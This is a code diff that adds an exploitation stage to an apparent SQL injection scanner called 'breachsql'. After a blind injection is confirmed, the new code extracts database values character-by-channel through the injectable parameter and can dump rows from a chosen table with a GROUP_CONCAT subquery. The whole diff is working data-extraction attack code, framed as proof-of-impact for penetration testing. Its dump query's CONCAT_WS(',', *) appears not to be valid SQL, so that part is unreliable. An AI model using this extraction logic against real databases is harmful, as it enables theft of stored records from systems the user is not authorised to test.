@@ -21,6 +21,9 @@ from .passive import fetch_seed, run_passive_checks
 from .active import scan_param
 from .blind import run_time_based, run_oob
 from .stacked import run_stacked
+from .extract import extract_value
+from commonhuman_payloads.sqli import get_extraction_targets
+from ..reporter import ExtractionFinding
 
 logger = get_logger("breachsql.pipeline")
 
@@ -214,3 +217,91 @@ def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> 
                 run_stacked(surface, evasions, opts, injector, result)
             except Exception as exc:
                 result.append_error(str(exc))
+
+    # 8. Exploitation — extract proof-of-impact data via confirmed blind channel
+    if opts.exploit and (result.boolean_based or result.time_based):
+        _run_exploit(url, opts, evasions, injector, result, surfaces)
+
+
+def _run_exploit(
+    url: str,
+    opts: ScanOptions,
+    evasions: List[str],
+    injector: Injector,
+    result: ScanResult,
+    surfaces: List[Dict[str, Any]],
+) -> None:
+    """Extract proof-of-impact data and optionally dump a table."""
+
+    # Pick best confirmed surface: boolean preferred over time-based
+    best_finding = None
+    mode = "boolean"
+    if result.boolean_based:
+        best_finding = result.boolean_based[0]
+    elif result.time_based:
+        best_finding = result.time_based[0]
+        mode = "time"
+
+    if best_finding is None:
+        return
+
+    # Locate matching surface dict
+    surface = next(
+        (s for s in surfaces
+         if s["url"] == best_finding.url
+         and s["single_param"] == best_finding.parameter
+         and s["method"] == best_finding.method),
+        None,
+    )
+    if surface is None:
+        return
+
+    # Fetch baseline for boolean mode
+    try:
+        from .active import _fetch
+        baseline_resp = _fetch(
+            injector, best_finding.url, best_finding.method,
+            surface["params"], best_finding.parameter, "",
+            json_body=surface.get("json_body", False),
+            path_index=surface.get("path_index", 0),
+        )
+        baseline = baseline_resp if baseline_resp is not None else ""
+    except Exception:
+        baseline = ""
+
+    dbms = (result.dbms_detected or opts.dbms or "auto").lower()
+    targets = get_extraction_targets(dbms)
+
+    if opts.dump:
+        targets = targets + [(f"dump:{opts.dump}",
+            f"(SELECT GROUP_CONCAT(CAST(c AS CHAR) SEPARATOR '|')"
+            f" FROM (SELECT CONCAT_WS(',', *) AS c FROM `{opts.dump}` LIMIT 50) t)")]
+
+    logger.info("Extracting %d target(s) via %s-blind on %s [%s]",
+                len(targets), mode, best_finding.parameter, best_finding.url)
+
+    for label, expr in targets:
+        try:
+            value = extract_value(
+                expr=expr,
+                surface=surface,
+                evasions=evasions,
+                opts=opts,
+                injector=injector,
+                baseline=baseline,
+                mode=mode,
+            )
+            if value:
+                logger.info("[EXTRACTED] %s = %s", label, value)
+                result.extracted.append(ExtractionFinding(
+                    url=best_finding.url,
+                    parameter=best_finding.parameter,
+                    method=best_finding.method,
+                    expr=expr,
+                    value=value,
+                    mode=mode,
+                ))
+            else:
+                logger.debug("extract: no value returned for %s", label)
+        except Exception as exc:
+            result.append_error(f"Extraction failed ({label}): {exc}")
